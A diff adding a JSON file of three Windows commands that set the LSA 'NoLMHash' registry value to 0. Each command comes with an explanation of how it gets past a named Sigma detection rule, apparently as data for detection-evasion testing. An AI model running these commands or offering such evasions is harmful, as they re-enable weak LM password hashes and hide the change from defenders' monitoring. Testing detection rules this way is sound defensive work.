@@ -1,0 +1,14 @@
+[
+  {
+    "output": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"NoLMHash\" /t REG_DWORD /d 0x00000000 /f",
+    "explanation": "The Sigma rule looks for a space before the zero (' 0'). By using the full hex representation '0x00000000', the command achieves the same registry modification while avoiding the specific string pattern ' 0' defined in the detection selection."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'NoLMHash' -Value 0\"",
+    "explanation": "The rule specifically targets command-line strings typically associated with 'reg.exe'. Using PowerShell's 'Set-ItemProperty' cmdlet changes the registry value effectively but uses a different syntax that does not match the 'CommandLine|contains' logic of the Sigma rule."
+  },
+  {
+    "output": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"NoLMHash\" /t REG_DWORD /d \"0\" /f",
+    "explanation": "Some parsers and simple string-matching rules fail if quotes are used around the value. While the rule looks for ' 0', providing it as '\"0\"' might bypass literal string matching depending on how the underlying SIEM processes quotes in command line arguments."
+  }
+]
